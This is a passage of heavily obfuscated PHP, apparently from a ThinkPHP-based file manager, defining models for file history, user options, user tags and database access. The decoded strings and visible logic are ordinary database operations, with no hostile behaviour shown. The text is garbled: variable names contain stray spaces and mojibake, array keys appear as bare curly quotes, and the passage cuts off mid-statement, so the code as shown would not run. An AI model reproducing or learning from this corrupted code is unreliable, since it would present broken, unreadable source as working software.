array_to_keyvalue($cø»…©Ö‚Ë, $D…Èğ¾‰»[33], $D…Èğ¾‰»[419]); $F¹××í˜¬Ü = array_slice($F¹××í˜¬Ü, $dÑ½¸Šìİ); if (!$CßÇ¸§øàˆ || !$F¹××í˜¬Ü) { return; } goto A™—†É†; f»£å¯¹ƒ¹: } public function listData($a±À¿èÁ) { goto eƒäÑØÛÑ´; eƒäÑØÛÑ´: $DöâŸÄÂĞ„ =& $_SERVER[“]; $dã¸ÇêÏİ = array($DöâŸÄÂĞ„[383] => $a±À¿èÁ); $D…¶ÏÂŠ± = $DöâŸÄÂĞ„[2313]; goto b“ÑêùÂ†¼; cÜ°À×® Í: $c—¨†ÔÔÀ = 3; if ($B‚‰Å˜Ö·² == $DöâŸÄÂĞ„[2311]) { $bóœöò·¦æ[$DöâŸÄÂĞ„[354]] = array_slice($bóœöò·¦æ[$DöâŸÄÂĞ„[354]], 0, $c—¨†ÔÔÀ); $bóœöò·¦æ[$DöâŸÄÂĞ„[351]] = array($DöâŸÄÂĞ„[2314] => 1, $DöâŸÄÂĞ„[2315] => 20, $DöâŸÄÂĞ„[2316] => 1, $DöâŸÄÂĞ„[2317] => count($bóœöò·¦æ[$DöâŸÄÂĞ„[354]])); } return $bóœöò·¦æ; goto fØˆíÊ¡Ï; b“ÑêùÂ†¼: $bóœöò·¦æ = $this->field($D…¶ÏÂŠ±)->where($dã¸ÇêÏİ)->order($DöâŸÄÂĞ„[2303])->selectPage(); $this->_listAppendUser($bóœöò·¦æ[$DöâŸÄÂĞ„[354]]); $B‚‰Å˜Ö·² = Model($DöâŸÄÂĞ„[1075])->get($DöâŸÄÂĞ„[2310]); goto cÜ°À×® Í; fØˆíÊ¡Ï: } protected function _listAppendUser(&$cåÉªØ¥â) { $c˜ƒïåÉÓÙ =& $_SERVER[“]; $Aˆ¬¤ì´Ù… = array_to_keyvalue($cåÉªØ¥â, $c˜ƒïåÉÓÙ[33], $c˜ƒïåÉÓÙ[1423]); $A¡±Á³·ˆù = Model($c˜ƒïåÉÓÙ[479])->userListInfo($Aˆ¬¤ì´Ù…); foreach ($cåÉªØ¥â as &$A¨ĞËˆº©Š) { $fªƒ©œ¶Íç = $A¨ĞËˆº©Š[$c˜ƒïåÉÓÙ[1423]]; $A¨ĞËˆº©Š[$c˜ƒïåÉÓÙ[378]] = $A¡±Á³·ˆù[$fªƒ©œ¶Íç] ? $A¡±Á³·ˆù[$fªƒ©œ¶Íç] : !1; } } public function fileInfo($BÖíÒÎ”ÍÃ) { $AôÕø¤Ô½î =& $_SERVER[“]; $Aá™¸Çê«ê = $this->tablePrefix; $DË„ÂØ“¨ = "{$Aá™¸Çê«ê}\151\x6f\x5f\x66\151\x6c\145\x20\146\x69\x6c\145\163\40\x6f\x6e\x20\146\151\154\x65\163\x2e\x66\x69\154\145\111\104\x20\x3d\x20\150\x69\163\164\x6f\162\171\56\x66\151\154\145\111\x44"; return $this->alias($AôÕø¤Ô½î[2318])->where(array($AôÕø¤Ô½î[385] => $BÖíÒÎ”ÍÃ))->join($DË„ÂØ“¨, $AôÕø¤Ô½î[2319])->find(); } public function removeItem($cˆ¹œ”‹×ğ) { $a¢¿øƒÄ‹ =& $_SERVER[“]; $a‹¤ÆÍ‹öÒ = array($a¢¿øƒÄ‹[385] => $cˆ¹œ”‹×ğ); $Aâ‡‹Ï¯ÀÈ = $this->where($a‹¤ÆÍ‹öÒ)->find(); if ($Aâ‡‹Ï¯ÀÈ) { $f’Ûî·ò´ø = $this->where($a‹¤ÆÍ‹öÒ)->delete(); Model($a¢¿øƒÄ‹[422])->remove($Aâ‡‹Ï¯ÀÈ[$a¢¿øƒÄ‹[419]]); return $f’Ûî·ò´ø; } return !1; } public function removeBySource($B«áÏéÛÄ‡) { goto dîÄô†¦Ğù; dîÄô†¦Ğù: $C‡¾¡·êÆœ =& $_SERVER[“]; if (!$B«áÏéÛÄ‡) { return !1; } if (!is_array($B«áÏéÛÄ‡)) { $B«áÏéÛÄ‡ = array($B«áÏéÛÄ‡); } goto b†ÎİÛ…¡¶; b†ÎİÛ…¡¶: $câæİíÌù = array($C‡¾¡·êÆœ[383] => array($C‡¾¡·êÆœ[7], $B«áÏéÛÄ‡)); $böÍ¬„¹æÂ = $this->field($C‡¾¡·êÆœ[420])->where($câæİíÌù)->select(); if ($böÍ¬„¹æÂ) { $this->where($câæİíÌù)->delete(); $D÷Á†ÁÃ‚† = array_to_keyvalue($böÍ¬„¹æÂ, $C‡¾¡·êÆœ[33], $C‡¾¡·êÆœ[419]); Model($C‡¾¡·êÆœ[422])->remove($D÷Á†ÁÃ‚†); } goto b—Îßíí¥Ä; b—Îßíí¥Ä: return !0; goto c¥ÆİÆ¼’; c¥ÆİÆ¼’: } public function setDetail($BÎ¾öãó‰·, $a’ÃÚ²³ë´) { $e¶ìÛÃê¬¾ =& $_SERVER[“]; return $this->where(array($e¶ìÛÃê¬¾[385] => $BÎ¾öãó‰·))->save(array($e¶ìÛÃê¬¾[2307] => $a’ÃÚ²³ë´)); } public function rollbackToItem($CÇ“Àâö¦·, $eÙåÜ–¯) { goto fÏŸ¹ÄÛŒ; b×˜’Ò²«˜: return $this->where(array($EŞÃ­”ÂêÒ[385] => $eÙåÜ–¯))->delete(); goto d‘×Å¾á»ß; D‚ÒÆÇ½: $CÊŸä¶—†¡ = $this->find($eÙåÜ–¯); $f‰›½ĞÂ¤¶ = array($EŞÃ­”ÂêÒ[419] => $CÊŸä¶—†¡[$EŞÃ­”ÂêÒ[419]], $EŞÃ­”ÂêÒ[77] => $CÊŸä¶—†¡[$EŞÃ­”ÂêÒ[77]], $EŞÃ­”ÂêÒ[107] => time(), $EŞÃ­”ÂêÒ[379] => USER_ID); Model($EŞÃ­”ÂêÒ[736])->where(array($EŞÃ­”ÂêÒ[369] => $CÇ“Àâö¦·))->save($f‰›½ĞÂ¤¶); goto b×˜’Ò²«˜; fÏŸ¹ÄÛŒ: $EŞÃ­”ÂêÒ =& $_SERVER[“]; $EÜ‘”…®²ƒ = Model($EŞÃ­”ÂêÒ[736])->sourceInfo($CÇ“Àâö¦·); $this->addHistory($EÜ‘”…®²ƒ); goto D‚ÒÆÇ½; d‘×Å¾á»ß: } public function clearSame($aÜÂæñÄõ) { goto dÙ™óÅ«¸â; dÙ™óÅ«¸â: $D½ÆÑ©ÉÃô =& $_SERVER[“]; $bÜŒ…±± = $this->listData($aÜÂæñÄõ); $Dğ²Å—Ã° = array_to_keyvalue_group($bÜŒ…±±, $D½ÆÑ©ÉÃô[419]); goto dÓ™‚èİî; bÉ¸…ù§„: if (!$bÁ÷—ïÈŸ²) { return; } $this->where(array($D½ÆÑ©ÉÃô[367] => array($D½ÆÑ©ÉÃô[7], $bÁ÷—ïÈŸ²)))->delete(); Model($D½ÆÑ©ÉÃô[422])->remove($EÎ®¾™æØ³); goto e‚æ¹ŠÍ‹; dÓ™‚èİî: $EÎ®¾™æØ³ = array(); $bÁ÷—ïÈŸ² = array(); foreach ($Dğ²Å—Ã° as $F¢œÂÉ„‹¼) { if (!$F¢œÂÉ„‹¼ || count($F¢œÂÉ„‹¼) <= 1) { continue; } foreach ($F¢œÂÉ„‹¼ as $eâ¿Ê¹Ì…Û) { $EÎ®¾™æØ³[] = $eâ¿Ê¹Ì…Û[$D½ÆÑ©ÉÃô[419]]; $bÁ÷—ïÈŸ²[] = $eâ¿Ê¹Ì…Û[$D½ÆÑ©ÉÃô[367]]; } } goto bÉ¸…ù§„; e‚æ¹ŠÍ‹: } public function userSpace() { $F«Âİ°Í¢ä =& $_SERVER[“]; $cµÃ³‹”„˜ = $this->tablePrefix; $C² ‹Ì¾ù = array($F«Âİ°Í¢ä[1413] => USER_ID); $eŒŒğ°É±– = "{$cµÃ³‹”„˜}\x69\x6f\x5f\x66\151\154\145\x20\x66\151\x6c\x65\163\x20\x6f\x6e\x20\x66\x69\154\145\x73\x2e\x66\x69\154\145\x49\104\x20\75\x20\150\151\163\x74\157\162\x79\x2e\x66\151\x6c\x65\111\x44"; return $this->alias($F«Âİ°Í¢ä[2318])->where($C² ‹Ì¾ù)->join($eŒŒğ°É±–, $F«Âİ°Í¢ä[2319])->sum($F«Âİ°Í¢ä[77]); } } goto EªÙ‰ËÚ¡¶; aÍåâÇ„ï²: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\137\157\x70\x74\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Eá†åá§ïÄ) { $Bà˜±İì™„ =& $_SERVER[“]; if (!defined($Bà˜±İì™„[427])) { define($Bà˜±İì™„[427], 0); } return "\x55\163\x65\x72\117\160\164\151\157\156\137{$Eá†åá§ïÄ}\x5f" . USER_ID; } protected function filterWhere($AƒÄªøÛ¢š) { $A¯ï˜‡Ã„ =& $_SERVER[“]; if (!defined($A¯ï˜‡Ã„[427])) { define($A¯ï˜‡Ã„[427], 0); } $AƒÄªøÛ¢š[$A¯ï˜‡Ã„[1423]] = USER_ID; return $AƒÄªøÛ¢š; } public function cacheRemoveUser($cÒ‘‰‰§ô, $c¹»ŸÉ¢ÕÕ) { return Cache::remove("\125\x73\x65\162\x4f\x70\x74\151\157\156\x5f{$cÒ‘‰‰§ô}\137" . $c¹»ŸÉ¢ÕÕ); } protected function optionDefault($f¿®§±ÆÖï = '') { $fóñâ¡ç»¦ =& $_SERVER[“]; if ($f¿®§±ÆÖï == $fóñâ¡ç»¦[33]) { return $GLOBALS[$fóñâ¡ç»¦[6]][$fóñâ¡ç»¦[2546]]; } if ($f¿®§±ÆÖï == $fóñâ¡ç»¦[2547]) { return $GLOBALS[$fóñâ¡ç»¦[6]][$fóñâ¡ç»¦[2548]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\162\x2e\164\141\147\x4c\x69\x73\x74"; public $modelType = "\x55\x73\x65\x72\117\160\164\151\x6f\156"; public $field = array("\156\x61\155\x65", "\x73\164\171\154\x65", "\163\x6f\162\164"); public function listData($Cƒí§ä²Ü = false, $cÜ©¸…İ§ = "\163\x6f\162\164", $FŞïÀ®Ì = false) { return parent::listData($Cƒí§ä²Ü, $cÜ©¸…İ§, $FŞïÀ®Ì); } public function remove($c‰ïÁ™Ã†Î) { return parent::remove($c‰ïÁ™Ã†Î); } public function add($EíÎøâô¬‹, $b•‹‹‹í‹¡ = "\154\x61\x62\145\x6c\55\147\162\x65\171\55\x6e\157\x72\x6d\x61\x6c") { $eŒ¯‡éÓ‘¶ =& $_SERVER[“]; if ($this->findByName($EíÎøâô¬‹)) { return !1; } $A°ÂˆÀ­ = array($eŒ¯‡éÓ‘¶[386] => $EíÎøâô¬‹, $eŒ¯‡éÓ‘¶[437] => $b•‹‹‹í‹¡, $eŒ¯‡éÓ‘¶[2099] => $this->getSort($eŒ¯‡éÓ‘¶[246]) + 1); return parent::insert($A°ÂˆÀ­); } public function update($fì©§ÂÔ¸†, $aè‚Åô‘Œ«) { $e˜«Ì¹öã© =& $_SERVER[“]; $fğå¸¯—è© = $this->listData($fì©§ÂÔ¸†); $aÆîËù¢Æ = $this->findByName($aè‚Åô‘Œ«[$e˜«Ì¹öã©[28]]); if (!$fğå¸¯—è© || $aÆîËù¢Æ && $aÆîËù¢Æ[$e˜«Ì¹öã©[367]] != $fğå¸¯—è©[$e˜«Ì¹öã©[367]]) { return !1; } return parent::update($fì©§ÂÔ¸†, $aè‚Åô‘Œ«); } public function moveTop($EÓò‡…¿œÇ) { $C®óØå‡ø =& $_SERVER[“]; $dïê“¢Ó‹¥ = parent::listData(); $Aò„àåÙ‘¯ = $this->getSort($C®óØå‡ø[245]); foreach ($dïê“¢Ó‹¥ as &$a²ÙÉ²ÅÄ„) { if ($a²ÙÉ²ÅÄ„[$C®óØå‡ø[367]] == $EÓò‡…¿œÇ) { $a²ÙÉ²ÅÄ„[$C®óØå‡ø[2116]] = $Aò„àåÙ‘¯; continue; } $a²ÙÉ²ÅÄ„[$C®óØå‡ø[2116]] += 1; } return parent::resetData($dïê“¢Ó‹¥); } public function moveBottom($bÕ·Ñ”÷¢ã) { $F¥›åÆÈ =& $_SERVER[“]; $fï‚÷‘…‚ = $this->getSort($F¥›åÆÈ[246]) + 1; return parent::update($bÕ·Ñ”÷¢ã, array($F¥›åÆÈ[2116] => $fï‚÷‘…‚)); } public function resetSort($B…ö©é‘äÂ) { goto bÊøŒˆéÅŒ; e››¨§¤’¡: for ($c³Û´‰à = 0; $c³Û´‰à < count($B…ö©é‘äÂ); $c³Û´‰à++) { $CÎÛÃÔİ¶[$B…ö©é‘äÂ[$c³Û´‰à] . $C³½…ÑÌ‰[33]] = $c³Û´‰à + 1; } $c½šÂ»¨¯Ü = parent::listData(); foreach ($c½šÂ»¨¯Ü as &$AÁÃ‰ƒæÁØ) { $a·Ó‚¼õ§´ = $CÎÛÃÔİ¶[$AÁÃ‰ƒæÁØ[$C³½…ÑÌ‰[367]]]; $AÁÃ‰ƒæÁØ[$C³½…ÑÌ‰[2116]] = $a·Ó‚¼õ§´ ? $a·Ó‚¼õ§´ : $AÁÃ‰ƒæÁØ[$C³½…ÑÌ‰[2116]]; } goto f†ÂÃ¬‰ã­; f†ÂÃ¬‰ã­: return parent::resetData($c½šÂ»¨¯Ü); goto EáŸÅãÖ†â; bÊøŒˆéÅŒ: $C³½…ÑÌ‰ =& $_SERVER[“]; $CÎÛÃÔİ¶ = array(); $B…ö©é‘äÂ = is_array($B…ö©é‘äÂ) ? $B…ö©é‘äÂ : array(); goto e››¨§¤’¡; EáŸÅãÖ†â: } private function getSort($D‚İ÷×Ş²) { $eÁáó‚…¦— =& $_SERVER[“]; $C«ö´Ë„í = parent::listData(); $Cëî›¶–£Ä = array_to_keyvalue($C«ö´Ë„í, $eÁáó‚…¦—[33], $eÁáó‚…¦—[2116]); if (!$Cëî›¶–£Ä) { $Cëî›¶–£Ä = array(0); } $d¨Ü§»êœ = $D‚İ÷×Ş² == $eÁáó‚…¦—[246] ? max($Cëî›¶–£Ä) : min($Cëî›¶–£Ä); return intval($d¨Ü§»êœ); } } goto AÈËùŸ®µƒ; BÛÍŒŒ´íƒ: define($_SERVER[“][230], 0); define($_SERVER[“][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\x6c\145", "\x6f\x72\x64\x65\162", "\141\x6c\151\x61\x73", "\x68\x61\166\151\156\x67", "\147\162\157\165\160", "\154\157\143\x6b", "\x64\x69\163\164\x69\156\143\164", "\x61\x75\x74\x6f", "\146\x69\154\x74\145\x72", "\166\141\x6c\151\144\x61\x74\145", "\x72\145\x73\165\154\x74", "\x62\151\x6e\144", "\164\157\153\x65\x6e"); public function __construct($cÏ³¶òÅŞº = '', $aê¹˜¬ø¹à = '', $fõ‰œ«§ƒ = '') { $f˜Œßİ÷º® =& $_SERVER[“]; $this->_initialize(); if (!empty($cÏ³¶òÅŞº)) { if (strpos($cÏ³¶òÅŞº, $f˜Œßİ÷º®[91])) { list($this->dbName, $this->name) = explode($f˜Œßİ÷º®[91], $cÏ³¶òÅŞº); } else { $this->name = $cÏ³¶òÅŞº; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($aê¹˜¬ø¹à)) { $this->tablePrefix = $f˜Œßİ÷º®[33]; } elseif ($f˜Œßİ÷º®[33] != $aê¹˜¬ø¹à) { $this->tablePrefix = $aê¹˜¬ø¹à; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($f˜Œßİ÷º®[232]); } $this->db(0, empty($this->connection) ? $fõ‰œ«§ƒ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $F‰·ãŒ¨²İ =& $_SERVER[“]; if (empty($this->fields)) { if (think_config($F‰·ãŒ¨²İ[233])) { $Eøì¼ô²ˆ = $this->dbName ? $this->dbName : think_config($F‰·ãŒ¨²İ[234]); $D¡äƒ¥Õ¯Ä = think_var_cache($F‰·ãŒ¨²İ[235] . strtolower(get_path_this($Eøì¼ô²ˆ) . $F‰·ãŒ¨²İ[91] . $this->name)); if ($D¡äƒ¥Õ¯Ä) { $fÓÅºÌğÀ› = think_config($F‰·ãŒ¨²İ[236]); if (empty($fÓÅºÌğÀ›) || $D¡äƒ¥Õ¯Ä[$F‰·ãŒ¨²İ[237]] == $fÓÅºÌğÀ›) { $this->fields = $D¡äƒ¥Õ¯Ä; return; } } } $this->flush(); } } public function flush() { goto Fã™ù‚ë; bù‹¬Ÿò«: foreach ($e¼ßÊÜËà‘ as $EîÉá‚ãœ¹ => $dñ¼¤½öæ²) { $eÂ„ˆª‡õ[$EîÉá‚ãœ¹] = $dñ¼¤½öæ²[$b¼ïÈ³»°š[29]]; if ($dñ¼¤½öæ²[$b¼ïÈ³»°š[36]]) { $this->fields[$b¼ïÈ³»°š[239]] = $EîÉá‚ãœ¹; if ($dñ¼¤½öæ²[$b¼ïÈ³»°š[39]]) { $this->fields[$b¼ïÈ³»°š[238]] = !0; } } } $this->fields[$b¼ïÈ³»°š[240]] = $eÂ„ˆª‡õ; if (think_config($b¼ïÈ³»°š[236])) { $this->fields[$b¼ïÈ³»°š[237]] = think_config($b¼ïÈ³»°š[236]); } goto dâÂ¼ˆÁæ; Fã™ù‚ë: $b¼ïÈ³»°š =& $_SERVER[“]; $this->db->setModel($this->name); $e¼ßÊÜËà‘ = $this->db->getFields($this->getTableName()); goto D¶¯‘½öÀÔ; dâÂ¼ˆÁæ: if (think_config($b¼ïÈ³»°š[233])) { $aÖ¹¯ÀÅ®¦ = $this->dbName ? $this->dbName : think_config($b¼ïÈ³»°š[234]); think_var_cache($b¼ïÈ³»°š[235] . strtolower(get_path_this($aÖ¹¯ÀÅ®¦) . $b¼ïÈ³»°š[91] . $this->name), $this->fields); } goto A¸ˆÙ…§´ˆ; D¶¯‘½öÀÔ: if (!$e¼ßÊÜËà‘) { return !1; } $this->fields = array_keys($e¼ßÊÜËà‘); $this->fields[$b¼ïÈ³»°š[238]] = !1; goto bù‹¬Ÿò«; A¸ˆÙ…§´ˆ: } public function switchModel($cÌ¦ìÉ¤ƒ, $d›í¼á¤¶£ = array()) { $EŞ‚êéˆ…Â =& $_SERVER[“]; $fÚôÜ”ãÛ© = ucwords(strtolower($cÌ¦ìÉ¤ƒ)) . $EŞ‚êéˆ…Â[241]; if (!class_exists($fÚôÜ”ãÛ©)) { think_exception($fÚôÜ”ãÛ© . think_lang($EŞ‚êéˆ…Â[242])); } $this->_extModel = new $fÚôÜ”ãÛ©($this->name); if (!empty($d›í¼á¤¶£)) { foreach ($d›í¼á¤¶£ as $aí‡ÆŠÌé) { $this->_extModel->setProperty($aí‡ÆŠÌé, $this->{$aí‡ÆŠÌé}); } } return $this->_extModel; } public function __set($FËõª¬Ì’‡, $f™Â×¸¥’ß) { $this->data[$FËõª¬Ì’‡] = $f™Â×¸¥’ß; } public function __get($dÑŞ‚ïìùœ) { return isset($this->data[$dÑŞ‚ïìùœ]) ? $this->data[$dÑŞ‚ïìùœ] : null; } public function __isset($bÙ‡à‡æ®É) { return isset($this->data[$bÙ‡à‡æ®É]); } public function __unset($EÈ…ƒÉ„ÕÊ) { unset($this->data[$EÈ…ƒÉ„ÕÊ]); } public function __call($e—ª·‡ŠŸ, $F¬ç—Èá‰) { $E¢¬ØøÄ„¾ =& $_SERVER[“]; if (in_array(strtolower($e—ª·‡ŠŸ), $this->methods, !0)) { $this->options[strtolower($e—ª·‡ŠŸ)] = $F¬ç—Èá‰[0]; return $this; } elseif (in_array(strtolower($e—ª·‡ŠŸ), array($E¢¬ØøÄ„¾[243], $E¢¬ØøÄ„¾[244], $E¢¬ØøÄ„¾[245], $E¢¬ØøÄ„¾[246], $E¢¬ØøÄ„¾[247]), !0)) { $BÆ“ñ™ß±Û = isset($F¬ç—Èá‰[0]) ? $F¬ç—Èá‰[0] : $E¢¬ØøÄ„¾[176]; $BÆ“ñ™ß±Û = $this->db->parseKey($BÆ“ñ™ß±Û); return $this->getField(strtoupper($e—ª·‡ŠŸ) . $E¢¬ØøÄ„¾[248] . $BÆ“ñ™ß±Û . $E¢¬ØøÄ„¾[249] . $e—ª·‡ŠŸ, $E¢¬ØøÄ„¾[243]); } elseif (strtolower(substr($e—ª·‡ŠŸ, 0, 5)) == $E¢¬ØøÄ„¾[250]) { $BÆ“ñ™ß±Û = think_parse_name(substr($e—ª·‡ŠŸ, 5)); $BÅò…·Ğ·[$BÆ“ñ™ß±Û] = $F¬ç—Èá‰[0]; return $this->where($BÅò…·Ğ·)->find(); } elseif (strtolower(substr($e—ª·‡ŠŸ, 0, 10)) == $E¢¬ØøÄ„¾[251]) { $Dëç¼…Ûõ = think_parse_name(substr($e—ª·‡ŠŸ, 10)); $BÅò…·Ğ·[$Dëç¼…Ûõ] = $F¬ç—Èá‰[0]; return $this->where($BÅò…·Ğ·)->getField($F¬ç—Èá‰[1]); } elseif (isset($this->_scope[$e—ª·‡ŠŸ])) { return $this->scope($e—ª·‡ŠŸ, $F¬ç—Èá‰[0]); } elseif (method_exists($this, $e—ª·‡ŠŸ)) { array_unshift($F¬ç—Èá‰, $e—ª·‡ŠŸ); return call_user_func_array(array($this, $E¢¬ØøÄ„¾[252]), $F¬ç—Èá‰); } else { return call_user_func_array(array(parent, $e—ª·‡ŠŸ), $F¬ç—Èá‰); } } protected function call() { goto f¬Î·¾­”™; DÛù‘‹»‡¬: if (isset($aªñ§œÄàº[$eÕß­Ä£—Š]) && $aªñ§œÄàº[$eÕß­Ä£—Š] === $d—ìˆÌ»ƒô) { think_exception(__CLASS__ . $EùöÑÂ×¤Æ[4] . $d—ìˆÌ»ƒô . think_lang($EùöÑÂ×¤Æ[253])); return; } $aªñ§œÄàº[] = $d—ìˆÌ»ƒô; if (method_exists($this, $EùöÑÂ×¤Æ[254])) { $Eù…®‰ŠÌÜ = call_user_func_array(array($this, $EùöÑÂ×¤Æ[255]), array($fÜô‹ê¡‘, $aªñ§œÄàº)); if (!is_null($Eù…®‰ŠÌÜ) && $Eù…®‰ŠÌÜ !== !1) { return $Eù…®‰ŠÌÜ; } } goto AÚÆ·É«ØÊ; f¬Î·¾­”™: $EùöÑÂ×¤Æ =& $_SERVER[“]; $aªñ§œÄàº = func_get_args(); $d—ìˆÌ»ƒô = array_shift($aªñ§œÄàº); goto AƒÜÃ“Œ·›; AƒÜÃ“Œ·›: $fÜô‹ê¡‘ = $d—ìˆÌ»ƒô; if (is_array($d—ìˆÌ»ƒô)) { $fÜô‹ê¡‘ = $d—ìˆÌ»ƒô[1]; $d—ìˆÌ»ƒô = $d—ìˆÌ»ƒô[0]; } $eÕß­Ä£—Š = count($aªñ§œÄàº) - 1; goto DÛù‘‹»‡¬; AÚÆ·É«ØÊ: $b›ÄôÆ¦¹ = call_user_func_array(array($this, $d—ìˆÌ»ƒô), $aªñ§œÄàº); if (method_exists($this, $EùöÑÂ×¤Æ[256])) { $Eù…®‰ŠÌÜ = call_user_func_array(array($this, $EùöÑÂ×¤Æ[257]), array($fÜô‹ê¡‘, $aªñ§œÄàº, $b›ÄôÆ¦¹)); if ($Eù…®‰ŠÌÜ) { return $Eù…®‰ŠÌÜ; } } return $b›ÄôÆ¦¹; goto d´™¨¡¹îù; d´™¨¡¹îù: } protected function _initialize() { } protected function _facade($E“‚ëÊ¦ºÍ) { $fî‹‚‘ğ¬Ğ =& $_SERVER[“]; if (!empty($this->fields)) { foreach ($E“‚ëÊ¦ºÍ as $F¿‡½Á£Àæ => $A‹ˆ¶»®è§) { if (!in_array($F¿‡½Á£Àæ, $this->fields, !0)) { unset($E“‚ëÊ¦ºÍ[$F¿‡½Á£Àæ]); } elseif (is_scalar($A‹ˆ¶»®è§)) { $this->_parseType($E“‚ëÊ¦ºÍ, $F¿‡½Á£Àæ); } } } if (!empty($this->options[$fî‹‚‘ğ¬Ğ[258]])) { $E“‚ëÊ¦ºÍ = array_map($this->options[$fî‹‚‘ğ¬Ğ[258]], $E“‚ëÊ¦ºÍ); unset($this->options[$fî‹‚‘ğ¬Ğ[258]]); } $this->_beforeWrite($E“‚ëÊ¦ºÍ); return $E“‚ëÊ¦ºÍ; } protected function _beforeWrite(&$DóĞììÜƒğ) { } public function add($fàåã„Ü¥ß = '', $añ”¨áªåÈ = array(), $Eêª±Ë°œÜ = false) { goto CÃçèÁˆˆÅ; CÃçèÁˆˆÅ: if (empty($fàåã„Ü¥ß)) { if (!empty($this->data)) { $fàåã„Ü¥ß = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[“][259]); return !1; } } $añ”¨áªåÈ = $this->_parseOptions($añ”¨áªåÈ); $fàåã„Ü¥ß = $this->_facade($fàåã„Ü¥ß); goto báËêÛ»¹»; D·¦Ú»éç: return $c¾É‚“ê¤Ø; goto BÊ‚ÄÉ“êÆ; báËêÛ»¹»: if (!1 === $this->_beforeInsert($fàåã„Ü¥ß, $añ”¨áªåÈ)) { return !1; } $c¾É‚“ê¤Ø = $this->db->insert($fàåã„Ü¥ß, $añ”¨áªåÈ, $Eêª±Ë°œÜ); if (!1 !== $c¾É‚“ê¤Ø) { $A‡ëê¢Ô³š = $this->getLastInsID(); if ($A‡ëê¢Ô³š) { $fàåã„Ü¥ß[$this->getPk()] = $A‡ëê¢Ô³š; $this->_after_insert($fàåã„Ü¥ß, $añ”¨áªåÈ); return $A‡ëê¢Ô³š; } $this->_after_insert($fàåã„Ü¥ß, $añ”¨áªåÈ); } goto D·¦Ú»éç; BÊ‚ÄÉ“êÆ: } protected function _beforeInsert(&$DŞøíåÚÙÍ, $eÃ¶ä¼‚‹Õ) { } protected function _after_insert($d åÏï‡, $bª¢÷…°ÁÒ) { } public function addAll($eóÂÀ¾£ï, $FÂßºàğ› = array(), $A”‰ê™‹® = false) { goto CŒ»˜›ƒÁº; DØØ …áõ¦: foreach ($eóÂÀ¾£ï as $C’œ¼‰ğµ => $aÕ’É¾Æ¯Ó) { $eóÂÀ¾£ï[$C’œ¼‰ğµ] = $this->_facade($aÕ’É¾Æ¯Ó); } if (method_exists($this->db, $d°îŞî™±[260])) { $e°×›ë„„ª = $this->db->insertAll($eóÂÀ¾£ï, $FÂßºàğ›, $A”‰ê™‹®); } else { $this->startTrans(); foreach ($eóÂÀ¾£ï as $C’œ¼‰ğµ => $aÕ’É¾Æ¯Ó) { $e°×›ë„„ª = $this->db->insert($aÕ’É¾Æ¯Ó, $FÂßºàğ›, $A”‰ê™‹®); } $this->commit(); } if (!1 !== $e°×›ë„„ª) { $C‘Êœ¬ìŠ– = $this->getLastInsID(); if ($C‘Êœ¬ìŠ–) { return $C‘Êœ¬ìŠ–; } } goto eäÙâÃ¾É±; CŒ»˜›ƒÁº: $d°îŞî™± =& $_SERVER[“]; if (empty($eóÂÀ¾£ï)) { $this->error = think_lang($d°îŞî™±[259]); return !1; } $FÂßºàğ› = $this->_parseOptions($FÂßºàğ›); goto DØØ …áõ¦; eäÙâÃ¾É±: return $e°×›ë„„ª; goto Bùˆö—¯¨à; Bùˆö—¯¨à: } public function selectAdd($Ešğ¼óÙõ¸ = '', $CƒŸìŠ„ñ = '', $dá¿«ô·šÒ = array()) { $DÌğµÓÕ¸› =& $_SERVER[“]; $dá¿«ô·šÒ = $this->_parseOptions($dá¿«ô·šÒ); if (!1 === ($F½‰ê ôêš = $this->db->selectInsert($Ešğ¼óÙõ¸ ? $Ešğ¼óÙõ¸ : $dá¿«ô·šÒ[$DÌğµÓÕ¸›[261]], $CƒŸìŠ„ñ ? $CƒŸìŠ„ñ : $this->getTableName(), $dá¿«ô·šÒ))) { $this->error = think_lang($DÌğµÓÕ¸›[262]); return !1; } else { return $F½‰ê ôêš; } } public function save($EéíÏôÒ = '', $aù¶ ù„¦¦ = array()) { goto E‹íÓÅÑ·Í; E‹íÓÅÑ·Í: $dÊ÷ºÚœ–Õ =& $_SERVER[“]; if (empty($EéíÏôÒ)) { if (!empty($this->data)) { $EéíÏôÒ = $this->data; $this->data = array(); } else { $this->error = think_lang($dÊ÷ºÚœ–Õ[259]); return !1; } } $EéíÏôÒ = $this->_facade($EéíÏôÒ); goto cÖº¾ëñ‘³; E¨àó¦à»‘: if (!1 !== $d–íÁ¶ËÆè) { if (isset($DÈÇëÉµŠ)) { $EéíÏôÒ[$fÛ„ë—ÆÊ] = $DÈÇëÉµŠ; } $this->_afterUpdate($EéíÏôÒ, $aù¶ ù„¦¦); } return $d–íÁ¶ËÆè; goto fˆ±ïƒÛ×È; féÉ“¿»•«: if (is_array($aù¶ ù„¦¦[$dÊ÷ºÚœ–Õ[263]]) && isset($aù¶ ù„¦¦[$dÊ÷ºÚœ–Õ[263]][$fÛ„ë—ÆÊ])) { $DÈÇëÉµŠ = $aù¶ ù„¦¦[$dÊ÷ºÚœ–Õ[263]][$fÛ„ë—ÆÊ]; } if (!1 === $this->_beforeUpdate($EéíÏôÒ, $aù¶ ù„¦¦)) { return !1; } $d–íÁ¶ËÆè = $this->db->update($EéíÏôÒ, $aù¶ ù„¦¦); goto E¨àó¦à»‘; cÖº¾ëñ‘³: $aù¶ ù„¦¦ = $this->_parseOptions($aù¶ ù„¦¦); $fÛ„ë—ÆÊ = $this->getPk(); if (!isset($aù¶ ù„¦¦[$dÊ÷ºÚœ–Õ[263]])) { if (isset($EéíÏôÒ[$fÛ„ë—ÆÊ])) { $Dìê³÷Å½[$fÛ„ë—ÆÊ] = 